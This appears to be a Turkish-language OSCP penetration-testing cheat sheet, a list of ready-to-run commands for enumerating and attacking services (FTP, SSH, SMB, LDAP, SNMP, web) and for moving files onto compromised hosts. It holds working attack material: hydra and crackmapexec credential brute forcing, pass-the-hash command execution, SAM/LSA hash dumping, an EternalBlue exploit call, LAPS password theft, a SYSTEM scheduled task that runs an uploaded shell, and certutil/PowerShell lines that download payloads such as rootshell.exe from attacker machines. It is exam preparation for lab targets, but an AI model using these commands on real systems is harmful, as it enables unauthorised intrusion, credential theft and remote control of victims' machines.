-----

## “OSCP Cheat Sheet”


KONU BAŞLIKLARI

```
NMAP
FTP
FINGER SERVICE
NIKTO
SMB & NETBIOS (445,139)
SMBMAP & SMBCLIENT
SNMPMAP
SMTP TELNET
DOSYA ARAMA
FILE TRANSFER
CRACKING
COMPILE
CONNECTIONS - SSH - RDP - MYSQL ...
HTTP SERVER AÇMA
DNS ZONE TRANSFER
INTERACTIVE SHELL
METERPRETER COMMANDS
PASSWORD ATTACKS

WEB ATTACKS
REVERSE SHELL
LFI
RFI
FILE UPLOAD
DIRECTORY TRAVERSAL
LOG POISONING
PHP WRAPPERS
COMMAND INJECTION
SHELL STABILIZE - TTY SHELL
SQL INJECTION
SHELLSHOCK
VSFTPD 2.3.4
Distccd - CVE-2004-2687
MS08-067
MS17-010 Eternalblue
PORT KNOCKING
WEBDAV
PHP TYPE JUGGLING
DRUPALGEDDON2 RCE

AD ATTACKS
AD ENUMERATION
POWERVIEW AD ENUM
AD ENUMERATION with SHARHOUND and BLOODHOUND
BLOODHOUND ÇALIŞTIRMA
MİMİKATZ KULLANIMI
KERBEROASTING
GOLDEN TICKET ATTACK
SILVER TICKET ATTACK
PASSWORD SPRAY ATTACKS
AS-REP ROASTING
DCSYNC ATTACK
LSASS DUMP
SAM & SYSTEM DUMP
LATERAL MOVEMENT
SHADOW COPIES
LLMNR POISONING
PIVOTING & TUNNELING
RELAY ATTACKS - NTLM RELAY
IMPACKET
PSEXEC
RPCCLIENT
LDAP
ENUM4LINUX
EXPLOIT SUGGESTOR  & NEXT GENERATION EXPLOIT SUGGESTOR
SEIMPERSONATION

WINDOWS PRIVILEGE ESCALATION
1) Exploiting Insecure Service Permissions – daclsvc
****2) Service Exploits - Unquoted Service Path
3) WEAK REGISTRY PERMISSIONS - REGSVC
4) FILE PERMISSION SERVICE
5) Exploiting AutoRun Programs
6) AlwaysInstallElevated
7) Searching For Passwords In Windows Registry
8) Passwords - Saved Creds
9) SCHEDULED TASKS
10) Exploiting Insecure GUI Apps
11) TOKEN IMPERSONATION
12) UAC BYPASS
13) TOKEN KIDNAPPING LOCAL PRIV ESC
14) FILE PERMISSION PRIV ESC

LINUX ENUMERATION & PRIVILEGE ESCALATION

Linux system enumeration
User Enumeration
NETWORK ENUMERATION
AUTOMATED ENUMERATION

1) Kernel zafiyetleri
2) CVE 2016-5195 - Dirty cow
3) CVE 2019-14287 - SUDO < 1.8.28
4) CVE-2019-18634 - SUDO < 1.8.26
5) CVE 2022-0847 - Dirty Pipe
6) PATH HIJACKING
7) CAPABILITIES
8) CRONJOB
9) LD_PRELOAD
10) NFS
```

**ENUMERATION**

NMAP

```
Domain adresine erişemezsen cat /etc/hosts dosyasını güncelle
sudo echo '192.168.229.224 test.com' | sudo tee -a /etc/hosts

Nmap Script Paths ve Güncelleme
ls /usr/share/nmap/scripts/
ls /usr/share/nmap/scripts/smb*
sudo nmap --script-updatedb

Canlı Host Keşfi (Ping Sweep)
nmap -sn 10.10.10.10-253
nmap -v -sn 10.10.10.10-253 -oG ping-sweep.txt

Port Taramaları
sudo nmap -sS 10.10.10.10             # SYN Scan (yarı açık)
nmap -sT 10.10.10.10                  # TCP Connect Scan
nmap -sT -A 10.10.10.10               # TCP Connect + detaylı
sudo nmap -sU 10.10.10.10             # UDP Scan
sudo nmap -sU -sS 10.10.10.10         # Birleştirilmiş UDP + SYN Scan

nmap -sU -sS -sT -sV -sC -A --script vuln -p-

Servis, Versiyon ve Script Taraması
sudo nmap -sV -sC -A -O --script vuln 10.10.10.10
sudo nmap -sV -sC -O -T4 -o result.txt 10.10.10.10 -Pn

Özel Script Kullanımı
nmap --script smb-vuln* -p 445 10.10.10.10
nmap -sV -p 80 --script http-vuln* 10.10.10.10
nmap -p80 --script=http-enum 10.10.10.10

Ping Engelleyen Hedeflerde Tarama
sudo nmap -sS -Pn 10.10.10.10

Tarama Hızı Ayarı
sudo nmap -sS -T4 10.10.10.10

Dosya ile IP Listesi Taraması
nmap -sS -iL targets.txt

OSCP için şunlar yeterli.
-sS: Hızlı ve gizli bir şekilde hedefte açık portları bulur. SYN Scan
-sC: Hedef hakkında detaylı bilgi toplamak için Nmap'in varsayılan scriptlerini çalıştırır.
nmap -Pn -n 10.10.10.10 -sC -sV -p- --open
nmap -sn 10.10.10.10-253
sudo nmap -sV -sC -A -O --script vuln 10.10.10.10 -Pn
sudo nmap -sS -sV -sC --script vuln -O -T4 -Pn 10.10.10.10 -oN quick-scan.txt
sudo nmap -sS -sV -sC --script vuln -O -T4 -Pn -p- 10.10.10.10 -oN full-scan.txt

**# TCP Taraması (Tüm portlar, hızlı ve dosyaya kayıt) sınavda açık portlar için bunları kullan 
nmap --open -sS $IP -p- --min-rate 5000
nmap -p- 192.168.247.62 -T4
# UDP Taraması (Arka planda çalışsın)
nmap --open -sU --top-ports 1000 $IP -v -oN udp_top1000.txt**

etc/host dosyasını güncelleme - örnek:
echo '192.168.198.187 access.offsec' | sudo tee -a /etc/hosts

---OSCP NMAP FLOW---

PORTLARI DA SIRAYLA VEREN TARAMA BİÇİMİ, SINAVDA BU ÜÇÜNÜ KULLANABİLİRSİN
nmap --open -sS $IP -p- --min-rate 5000 -Pn -n -oN nmap_tcp.txt; echo -e "\n[+] TCP PORTLAR: $(grep -E '^[0-9]+/' nmap_tcp.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')"
nmap --open -sU --top-ports 100 $IP --min-rate 2000 -Pn -n -oN nmap_udp.txt; echo -e "\n[+] UDP PORTLAR: $(grep -E '^[0-9]+/' nmap_udp.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')"

# Örnek: Üstteki TCP taramasından 80,445,3389 çıktı varsayalım
nmap -sC -sV -$IP -Pn -n -p 53,80,88,123, 135,139,389,445,464,593,636,1433,3268
```

FTP  (21)

```
21-FTP

ftp farklı port ile bağlanma
ftp IP PORT

ftp anonim login

parola - yok

--> Anonim ftp connection
    ftp 10.10.10.10
    anonymous veya ftp
    parola yok 
    --> anonim ftp ile içeri reverse shell koyarsın
    --> netcat açıp webden çağırırsın - shell

--> Default credentials
    ftp:ftp
    admin:admin
    /usr/share/wordlists/dirb/common
    /usr/share/seclists/Usernames/
		/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

--> Ftp brute force
	  hydra -l ftp -P ftp_usernames.txt <ftp://10.10.10.10>
    hydra -L ftp_usernames.txt -P ftp_usernames.txt ftp://192.168.52.46
    hyda -L usernames.txt -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://10.10.10.10 

--> Bilinen zafiyetler
		vsftpd 2.3.4 backdoor — banner 2.3.4 gösteriyorsa exploit araştır.

--> Upload sonrası kullanılacak akış (web + shell)
		Upload shell.php veya shell.jsp mümkünse (FTP sunucusu aynı zamanda web root'a bağlıysa):
		put shell.php
    # sonra tarayıcıda: `http://target.com/uploads/shell.php`

KOMUTLAR

--> Dosya yükleme
		put test.txt

--> Dosya indirme
		get test.txt

--> bütün dosyaları indirme
		mget *

--> ftp den wget ile dosya indirme örneği
		wget -m <ftp://anonymous:anonymous@10.10.10.10>

-->	İndirirken FTP istemcisi bazen her dosya için onay isteyebilir (özellikle interaktif moddaysa).
		Bu onayları otomatikleştirmek için prompt komutuyla etkileşim devre dışı bırakılabilir:
			ftp> prompt
			Interactive mode off.
			ftp > recurse on
			ftp> mget *

--> eğer komutların çalışmıyorsa passive yazmayı dene
```

SSH  (22)

```
--> Default credentials
		ssh:ssh

--> Username enumeration
		<https://www.exploit-db.com/exploits/45233> OpenSSH < 7.7

--> SSH brute force

		hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
		muadili crackmapexec -- crackmapexec ssh 10.10.10.10 -u username.txt -p password.txt

		Kullanıcı adı sabit, parola dosyadan
		hydra -l george -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.201

		Parola sabit, kullanıcı adı dosyadan
		hydra -L /usr/share/wordlists/users.txt -p "SuperSecret123" ssh://192.168.50.201

		Hem kullanıcı adı hem parola dosyadan
		hydra -L /users.txt -P /passwords.txt ssh://192.168.50.201

		Eğer farklı port üzerinden denenmek istenirse -s parametresi eklenerek port belirtilir.
		hydra -L /users.txt -P /passwords.txt -s 3333 ssh://192.168.50.201

id rsa file - default location example C:/Users/usernama_here/.ssh/id_rsa
id_ecdsa file - default location example C:/home/burak/.ssh/id_ecdsa     bunu kırman gerekebilir
john hash -w=/usr/share/wordlists/rockyou.txt
ssh -i id_ecdsa burak@10.10.10.10 -p 2222

/Users/burak/.ssh/id_rsa 
id_rsa dosyasını kaydet 
chmod 600 id_Rsa
ssh -i id_rsa root@ip
```

SMTP & TELNET (25,23)

```
(Simple Mail Transfer Protocol), e-posta gönderimi için kullanılan bir protokoldür. SMTP sunucusuna telnet veya netcat (nc) ile bağlanılabilir.

nc -nv 192.168.50.8 25 → ✅ SMTP sunucusuna bağlanmak için
telnet 192.168.50.8 25 → ✅ SMTP sunucusuna bağlanmak için
telnet 192.168.50.8 23 → ✅ Telnet servisine bağlanmak için

TEMEL SMTP KOMUTLARI
______________________________________________________________
| Komut                       | Açıklama                     |
|-----------------------------|------------------------------|
| HELO yourdomain.com         | Sunucuya selam gönder        |
| VRFY username               | Kullanıcı var mı sorgula     |
| EXPN alias                  | Alias kullanıcıları göster   |
| MAIL FROM:<you@domain.com>  | Mail gönderen belirle        |
| RCPT TO:<victim@domain.com> | Alıcı adresi belirle         |
| DATA                        | Mail içeriğini yazmaya başla |
| QUIT                        | Bağlantıyı kapat             |
|_____________________________|______________________________|
```

FINGER SERVICE (79)

```
Eski linux sistemlerinde kullanılan bir servistir.

finger                   Yerel makinedeki aktif kullanıcılar hakkında bilgi verir.
finger @10.10.10.10      finger servisi (port 79) açıksa ve açık kullanıcı listesi varsa, sistemde oturum açmış kullanıcıları gösterir.
finger root              Yerel sistemdeki root kullanıcısı hakkında bilgi verir.
finger root@10.10.10.10  finger servisi açıksa 10.10.10.10 IP adresindeki root kullanıcısına ait bilgileri almaya çalışır.

<https://pentestmonkey.net/tools/user-enumeration/finger-user-enum>
./finger-user-enum.pl -U /Seclist-master/Usernames/Names/names.txt -t 10.129.32.168
```

WEB SERVICES (80)

```
Web servisleri varsa
--> exploit aranır
--> dizin tarama

Login paneli varsa
--> default credentials
--> sql injection
--> Brute force

Dosya yükleme varsa
--> reverse shell

Genel enumeration
--> Nikto

web sayfasından bilgi ayıklama - html taglarını çıkararak ne varne yok verir 
curl -s http://192.168.120.132:8000/ | html2markdown

		nikto -h <https://test.com>
		nikto -h test.com  -p 80 -o nikto.txt
		nikto -h `http://10.10.10.10` -p 80 -o nikto.txt

Subdomain Fuzzing
subfinder -d facebook.com -o results.txt
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

Directory Fuzzing

dirsearch dir -u <https://example.com> -w /directory-list-2.3-medium.txt -x 403,404,500 --random-agent --full-url

gobuster dir -u <https://example.com> -w /wordlistscommon.txt
gobuster dir -u <https://example.com> -w /big.txt -t 4 --delay 1s -o results.txt
gobuster dir -u <https://example.com> -w /big.txt -x php,html,htm
gobuster dir -u htps://example.com -w /big.txt -b 403,404,500 -t 3
gobuster fuzz -u <https://example.com?FUZZ=test> -w /parameter-names.txt

python3 dirsearch.py -u <https://testurl.com/>
python3 dirsearch.py -u <https://testurl.com/> -x 403,404,500 -t 10 -r -R 3 --full-url --random-agent -o report.txt
python3 dirsearch.py -u <https://testurl.com/> -w /wordlist.txt -x 403,404,500 -t 10 -r -R 2 --full-url --random-agent -o report.txt
python3 dirsearch.py -u <https://testurl.com/> -w /wordlist.txt -x 403,404,500 -t 10 -r -R 2 --full-url --random-agent -o results.txt -e php, asp, aspx, jsp, py, txt, conf, config, bak, backup, swp, old, db, sql,log,xml,js,json -f

File fuzzing
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.247.215 -k -x php,txt,conf -t 30

dirsearch -u <https://test.com> --random-agent -o report.txt

feroxbuster
# Temel tarama
feroxbuster -u <https://example.com> -w /path/to/directory-list-2.3-medium.txt

# Durum kodlarını filtrele (403,404,500 engellenen sayfalar gibi)
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt -b 403,404,500

# Uzantılarla tarama (php, html, htm)
feroxbuster -u <https://example.com> -w /path/to/big.txt -x php,html,htm

# Thread sayısı 4, gecikme 1 saniye
feroxbuster -u <https://example.com> -w /path/to/big.txt -t 4 --delay 1000

# Random User-Agent kullanımı
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt --random-agent

# Yönlendirmeleri takip et, maksimum 3 yönlendirme
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt -r --max-redirect 3

# Çıktıyı dosyaya kaydet
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt -o results.txt

# Full URL gösterimi
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt --full-url

# Çoklu uzantı, durum kodu filtresi, random agent, full url, thread 10, yönlendirme 2, dosya kaydet
feroxbuster -u <https://example.com> -w /path/to/wordlist.txt -x php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql,log,xml,js,json -b 403,404,500 --random-agent --full-url -t 10 -r --max-redirect 2 -o results.txt

# Parametre fuzzing (FUZZ parametreli URL)
feroxbuster -u '<https://example.com/?FUZZ=test>' -w /path/to/parameter-names.txt
```

RPCCLIENT (135)

```
Rpcclient, Windows makinelerdeki SMB/RPC servislerine bağlanarak bilgi toplamak (enumeration) için kullanılır. Genellikle TCP 445 veya 135 portu üzerinden çalışır.
Özellikle null session açıksa veya AD ortamında bilgi çekilmek isteniyorsa kullanılır.

Kullanım Senaryoları:
- SMB erişimi yok ama 135 portu açık → rpcclient kullanılabilir
- Null session açık → kimlik doğrulama olmadan veri çekilebilir
- Kullanıcı ve grup bilgisi toplamak → enumdomusers, enumdomgroups
- SID çözümlemesi → lookupsids, lookupnames
- Sistem/domain bilgisi → srvinfo, getdcname

Bağlantı Komutları: Null Session ile
rpcclient -U "" <target-ip>

Kullanıcı ve Şifre ile:
rpcclient -U "username" <target-ip>

rpcclient null session
rpcclient -U '%' 192.168.116.40

Sık Kullanılan Komutlar:
enumdomusers        # Kullanıcı listesini getirir
queryuser RID       # Belirli kullanıcı hakkında bilgi
enumdomgroups       # Domain gruplarını listeler
querygroup RID      # Belirli grubun üyelerini gösterir
lookupsids <SID>    # SID'den kullanıcı çözümleme
lookupnames <user>  # Kullanıcıdan SID çözümleme
getdompwinfo        # Parola politikası bilgisi
srvinfo             # Hedef sistem bilgisi
getdcname           # Domain Controller bilgisi
netshareenum        # Paylaşılan klasörleri listeler

Örnek Kullanım:
rpcclient -U "" 10.10.10.10
> enumdomusers
> queryuser 0x1f4
> enumdomgroups
> querygroup 0x201
> srvinfo
> getdompwinfo
> lookupsids S-1-5-21-...-500
```

IMAP  (143)

```jsx
Bağlantı: 			        nc $IP 143
Giriş: 				          a1 LOGIN jonas@localhost SicMundusCreatusEst
Klasörleri Listele 		  a2 LIST "" "*"
Inbox'ta kaç mail var? 	a3 EXAMINE INBOX
Giriş Yap/Seç: 			    a4 SELECT INBOX
Tüm Mailleri Oku: 		  a5 FETCH 1:* (RFC822)
```

SMB & NETBIOS (445,139)

```
# ============================================================
# SMB & NETBIOS PENTEST - OSCP CHEAT SHEET
# Portlar: 139 (NetBIOS), 445 (SMB)
# ============================================================

# ── 1. KEŞİF (ENUMERATION) ──────────────────────────────────

nbtscan -r 192.168.50.0/24                                       # NetBIOS: hostname, user, share, MAC tara
nmap -p 139,445 --script smb-enum-shares,smb-enum-users <IP>     # Nmap SMB scriptleri
enum4linux -a <IP>                                               # Tüm testleri çalıştır (kullanıcı, grup, policy)
enum4linux -v <IP>                                               # Ayrıntılı enumeration

# ── 2. PAYLAŞIM LİSTELEME ───────────────────────────────────

# smbclient
smbclient -L //<IP> -N                                           # Null session (anonim) listeleme
smbclient -L //<IP> -U kullanici                                 # Kullanıcı adıyla listeleme

# smbmap  →  READ/WRITE izinlerini hızlıca görmek için idealdir
smbmap -H <IP>                                                   # Anonim tarama
smbmap -H <IP> -u john -p 'pass123'                              # Kimlik bilgisiyle
smbmap -H <IP> -u john -p 'pass123' -R                           # Recursive (alt dizinlerle birlikte listele)

# netexec (nxc) -> crackmapexec'in güncel versiyonu
nxc smb <IP> -u '' -p '' --shares                                # Null session paylaşımları listele
nxc smb <IP> -u '' -p '' --users                                 # Null session kullanıcıları listele
nxc smb 192.168.1.0/24 -u '' -p ''                               # Ağ geneli temel SMB taraması

# ── 3. BAĞLANTI KURMA ───────────────────────────────────────

smbclient //<IP>/share -N                                        # Anonim bağlan
smbclient //<IP>/share -U john                                   # Kullanıcıyla bağlan (parola sorar)
smbclient //<IP>/share -U "john%P@ss!"                           # Kullanıcı + parola (özel karakter varsa tırnak!)
smbclient //<IP>/share -U john -W DOMAINADI                      # Domain belirterek (-W = workgroup)
smbclient //<IP>/share -U Administrator --pw-nt-hash <NTHASH>    # Pass-the-Hash
smbclient //<IP>/share -U user%pass -t 300                       # Timeout ayarı (saniye)
smbclient //<IP>/share -N --option='client min protocol=NT1'     # Eski sistem (XP/2003) hatası için NT1 zorla

# ── 4. SMB SHELL KOMUTLARI ──────────────────────────────────

ls                   # Listele
cd <dizin>           # Dizin değiştir
pwd                  # Mevcut dizini göster
get <dosya>          # Dosya indir
put <dosya>          # Dosya yükle
more <dosya>         # İndirmeden oku
exit                 # Çıkış

# Tüm klasörü toplu indir (smb shell içinde sırayla çalıştır)
prompt off           # Her dosyada onay sormayı kapat
recurse on           # Alt dizinleri kapsama al
mget * # Her şeyi indir

# Shell açmadan dışarıdan tek satırda komut çalıştır (-c)
smbclient //<IP>/share -U user%pass -c 'ls'
smbclient //<IP>/share -U user%pass -c 'get flag.txt'

# ── 5. BRUTE FORCE / SPRAYING ───────────────────────────────

nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success # Kaba kuvvet saldırısı

# ── 6. UZAK KOMUT ÇALIŞTIRMA & RELAY (Post-Exploitation) ────

nxc smb <IP> -u admin -p 'pass' -x 'whoami'                      # CMD üzerinden komut çalıştır
nxc smb <IP> -u admin -p 'pass' -X 'whoami'                      # PowerShell üzerinden komut çalıştır
nxc smb <IP> -u admin -H <NTHASH> -x 'whoami'                    # Pass-the-Hash ile RCE (NTLM hash'i ile)

# SMB imzası (SMB Signing) kapalı makineleri bul (NTLM Relay saldırısı için)
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```

LDAP LDAPS LAPS (389,636)

```
# ============================================================
# LDAP / LDAPS / LAPS - OSCP CHEAT SHEET
# Portlar: 389 (LDAP), 636 (LDAPS)
# ============================================================
LDAP Nedir?
LDAP, Active Directory'deki kullanıcı, grup, bilgisayar gibi nesneleri sorgulamak için kullanılan bir protokoldür.
Hedef: LDAP ile domain hakkında bilgi toplamak (users, groups, computers, policies vs.)
Kullanılan Araçlar:
- ldapsearch (Linux yerleşik,  nmap (ldap script'leri), crackmapexec, windapsearch (Python aracı)

LDAP Portları:
- TCP 389: LDAP (şifresiz veya NTLM kimlik doğrulamalı)
- TCP 636: LDAPS (SSL ile LDAP)

İpuçları:
- Eğer ldapsearch ile anonymous login başarılıysa, domain bilgisi sızıyor olabilir.
- crackmapexec ile kontrol edilebilir:
- crackmapexec ldap <ip> -u '' -p ''

Saldırı Senaryosu:
1. Port 389 açık
2. ldapsearch ile anonymous login yapılır
3. Kullanıcılar toplanır
4. Elde edilen kullanıcı listesi ile password spraying yapılabilir*

# ── 1. KEŞİF ────────────────────────────────────────────────

nmap -p 389,636 --script ldap-search,ldap-rootdse <IP>       # LDAP servis taraması
nxc ldap <IP> -u '' -p ''                                    # Anonymous login test et

# ── 2. ANONYMOUS (NULL) SORGU ───────────────────────────────

# BaseDN bilgisini bulmak için (domain bilinmiyorsa buradan öğren)
ldapsearch -x -H ldap://<IP> -s base namingContexts

# Tüm nesneleri çek ve dosyaya kaydet
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" > ldap_dump.txt

# ── 3. KİMLİK BİLGİSİYLE SORGU ──────────────────────────────

# Temel bağlantı formatı
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"

# Kullanıcıları listele
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Grupları listele
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)" cn

# Bilgisayarları listele (OS bilgisiyle)
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=computer)" sAMAccountName operatingSystem

# Belirli kullanıcıyı sorgula
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(sAMAccountName=hedef_kullanici)"

# ── 4. PAROLA AVLAMA (Password Hunting) ─────────────────────

# Description alanında parola ara (sık rastlanan bir hata!)
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(description=*pass*)" description

# userPassword alanını kontrol et
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(userPassword=*)" userPassword

# Kerberoasting için SPN kayıtlı kullanıcıları listele
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" servicePrincipalName

# ── 5. LAPS (Local Admin Password Solution) ─────────────────
# LAPS → Domain makinelerinin yerel Administrator parolasını AD'de saklar.
# ms-MCS-AdmPwd alanını okuyabiliyorsan direkt Administrator şifresine erişirsin.

# LAPS şifresini ldapsearch ile çek
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# LAPS şifresini nxc ile çek (en hızlı yöntem)
nxc ldap <DC_IP> -u <USER> -p <PASSWORD> --laps

# LAPS var mı kontrol et (Windows üzerinde)
dir "C:\Program Files\LAPS"
# BloodHound'da → 'ReadLAPSPassword' yetkisi olan hesabı kontrol et

# ── 6. LAPS ŞİFRESİYLE ERİŞİM SAĞLAMA ──────────────────────

# Evil-WinRM ile (port 5985 açıksa)
evil-winrm -i <TARGET_IP> -u Administrator -p 'LAPS_SIFRESI'

# Impacket-psexec ile (port 445 açıksa → direkt SYSTEM verir)
impacket-psexec Administrator:'LAPS_SIFRESI'@<TARGET_IP>

# Impacket-wmiexec ile (UAC bypass gerekiyorsa alternatif)
impacket-wmiexec Administrator:'LAPS_SIFRESI'@<TARGET_IP>

# ── 7. LAPS → YETKİ YÜKSELTME (PowerShell) ──────────────────
# Direkt giriş yapamıyorsan, düşük yetkili shell üzerinden zamanlanmış görev oluştur

$pw    = ConvertTo-SecureString "LAPS_SIFRESI" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("Administrator", $pw)

# Zamanlanmış görev oluştur (shell.exe önceden upload edilmeli)
Invoke-Command -Computer <COMPUTERNAME> -Credential $creds -ScriptBlock {
    schtasks /create /sc onstart /tn SHELL /tr C:\Windows\Temp\shell.exe /ru SYSTEM
}

# Görevi çalıştır
Invoke-Command -Computer <COMPUTERNAME> -Credential $creds -ScriptBlock {
    schtasks /run /tn SHELL
}

# Temizlik (görevi sil)
Invoke-Command -Computer <COMPUTERNAME> -Credential $creds -ScriptBlock {
    schtasks /delete /tn SHELL /f
}
```

SNMP (161,162)

```
snmp-check ip

snmpwalk -c public -v1 10.10.10.10 > snmp-public.txt

1.3.6.1.2.1.25.1.6.0	  System Processes
1.3.6.1.2.1.25.4.2.1.2	Running Programs
1.3.6.1.2.1.25.4.2.1.4	Processes Path
1.3.6.1.2.1.25.2.3.1.4	Storage Units
1.3.6.1.2.1.25.6.3.1.2	Software Name
1.3.6.1.4.1.77.1.2.25	  User Accounts
1.3.6.1.2.1.6.13.1.3	  TCP Local Ports

Using snmpwalk to enumerate the entire MIB tree
snmpwalk -c public -v1 -t 10 10.10.10.10

Enumerate Windows users
snmpwalk -c public -v1 10.10.10.101 1.3.6.1.4.1.77.1.2.25

Enumerate Windows processes
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2

Enumerate installed software
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2

Enumerate open TCP ports
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.6.13.1.3

snmpwalk -c public -v1 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
public topluluk adı kullanarak, NET-SNMP-EXTEND-MIB'de tanımlı nsExtendOutputFull nesnesindeki tüm alt nesnelerin değerlerini sorgular.

**snmp brute force olayı - kesinlikle uygula** 
hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.135.156
snmpwalk -v2c -c public 192.168.135.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

CRACKMAPEXEC

```
# Temel SMB taraması
crackmapexec smb <target>

# SMB paylaşımlarını listele
crackmapexec smb <target> --shares

# SMB oturumlarını göster
crackmapexec smb <target> --sessions

# Aktif kullanıcıları listele
crackmapexec smb <target> --users

# Belirli kullanıcı ve parola ile giriş testi
crackmapexec smb <target> -u <username> -p <password>

# Parolasız login denemesi
crackmapexec smb <target> -u <username> -p ''

# Kullanıcı ve parola listesi ile brute force
crackmapexec smb <target> -u users.txt -p passwords.txt

# Pass-the-Hash (NTLM hash ile login)
crackmapexec smb <target> -u <username> -H <NTLM_hash>

# Kerberos ile kimlik doğrulama (ticket ile)
crackmapexec smb <target> -u <username> -k

# Sistemde komut çalıştırma
crackmapexec smb <target> -u <username> -p <password> -x '<command>'

# MS17-010 (EternalBlue) zafiyet taraması
crackmapexec smb <target> --ms17-010

# MS17-010 exploit denemesi (dikkatli kullan)
crackmapexec smb <target> -u <username> -p <password> --exec-method=psh --ms17-010-exploit -x '<command>'

# SAM hash'lerini çek
crackmapexec smb <target> -u <username> -p <password> --sam

# LSA hash'lerini çek
crackmapexec smb <target> -u <username> -p <password> --lsa

# Yazılabilir SMB paylaşımlarını listele
crackmapexec smb <target> -u <username> -p <password> --shares --writable

# LDAP üzerinden kullanıcı listele (domain ortamı)
crackmapexec ldap <target> -u <username> -p <password> --users

# Belirli grubun üyelerini listele (domain)
crackmapexec smb <domain_controller> -u <username> -p <password> --group-members <group>

# Temel WinRM bağlantısı ve komut çalıştırma
cme winrm <target> -u <username> -p <password> -x 'whoami'

# Pass-the-Hash ile WinRM bağlantısı
crackmapexec winrm <target> -u <username> -H <NTLM_hash> -x 'ipconfig'

# Kerberos ile kimlik doğrulama (ticket ile)
crackmapexec winrm <target> -u <username> -k -x 'net user'

# Kullanıcı ve parola listesi ile brute force denemesi
crackmapexec  winrm <target> -u users.txt -p passwords.txt

# Çoklu komut çalıştırma
crackmapexec winrm <target> -u <username> -p <password> -x 'whoami; hostname'
```

DOSYA ARAMA

```
Herhangi bir dosyanın yolunu bulma linux
find / -name "dosya_ismi" 2>/dev/null
powershell
Get-ChildItem -Path C:\\ -Recurse -Filter "dosya_ismi" -ErrorAction SilentlyContinue

Belirlenen isimdeki dosyaların tam yolunu listeler linux
locate example.txt
powershell
gci -Path C:\\ -Recurse -Filter "example.txt" -ErrorAction SilentlyContinue

powershellde bir dosya içerisindeki NTLM yazan yerleri arar - dosya arama başlığı yazıp ekle 
PS> Get-Content fileMonitorBackup.log | Select-String -Pattern “NTLM” -CaseSensitive

dosya içine belli bir kelimeyi arama ve hangi satırda olduğunu gösterme - kali 
# "crash" veya "crashed" veya "crashes" burda crash kelimesini aradık

 grep -n "crash\(ed\|es\)\?" enum.txt 
```

FILE TRANSFER

```
WINDOWSTA KALİ'DEN DOSYA İNDİRME

Method 1
KALI: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
veya
impacket-smbserver kali .
WINDOWS: copy \\\\10.10.10.10\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe
copy \\\\10.10.16.6\\kali\\nc.exe nc.exe

Method 2
KALI: python3 -m http.server 5555
WINDOWS: certutil.exe -f -urlcache `http://10.10.16.16:5555/windows/winPeas.exe`

Method 3:
KALI: python3 -m http.server 5555
WINDOWS: certutil -urlcache -split -f "http://10.10.10.10:5555/MS10-059.exe" MS10-059.exe
alternatif certutil.exe -urlcache -f http://192.168.45.215:80/GodPotato-NET4.exe C:\\Windows\\Temp\\GodPotato-NET4.exe
-split → indirme işlemini küçük parçalara bölerek yapar, indirilen dosya → sadece tek ve tam dosya olarak kaydedilir.

Method 4:
KALI: python3 -m http.server 5555
Windows: PS ile: (new-object System.Net.WebClient).DownloadFile('`http://10.10.14.24:5555/SharpHound.exe`', 'C:\\Users\\burak\\Desktop\\SharpHound.exe')

Method 5:
KALI: python3 -m http.server 5555
WINDOWS CMD İLE: powershell -c "(new-object System.Net.WebClient).DownloadFile('`http://10.10.14.9:2222/rootshell.exe`', 'C:\\Users\\Public\\Downloads\\rootshell.exe')"
                 powershell -Command "Invoke-WebRequest -Uri '`http://10.10.14.9:2222/rootshell.exe`' -OutFile 'C:\\Users\\Public\\Downloads\\rootshell.exe'"

KALİ'DE WİNDOWSTAN DOSYA İNDİRME

Windows makinede bir HTTP sunucu aç (örneğin PowerShell ile):
cd C:\\Path\\To\\Folder
python -m http.server 8000

Sonra Kali’de:
wget http://WINDOWS_IP:8000/dosya_adi

Windows’da paylaşım açık → Kali’den smbclient ile çek.
smbclient //10.10.10.10/public -N

windowsta powershell üzerinden
powershell iwr -uri `http://192.168.49.52:8000/r.exe` -O r.exe
